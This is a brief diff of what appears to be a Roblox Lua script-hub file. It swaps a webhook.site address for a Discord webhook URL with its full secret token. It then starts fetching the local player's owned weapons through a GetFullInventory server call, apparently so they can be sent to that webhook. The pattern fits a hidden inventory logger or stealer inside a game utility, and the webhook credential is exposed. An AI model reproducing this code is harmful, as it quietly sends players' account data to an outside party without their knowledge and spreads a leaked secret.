@@ -141,7 +141,7 @@ end
 
 SaveManager:LoadAutoloadConfig()
 
-local url = "https://webhook.site/2237ad77-a72e-4fe5-a9ba-50d3239287c6"
+local url = "https://discord.com/api/webhooks/1296489854061903894/WU2SIziNuj1qUPFKbz5hYKKrFqV0n6jv_xWhUrACj3OJMtHCH7zoFISKoUcg60H_ma_O"
    
 t = {}
 for i,v in game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)["Weapons"]["Owned"] do
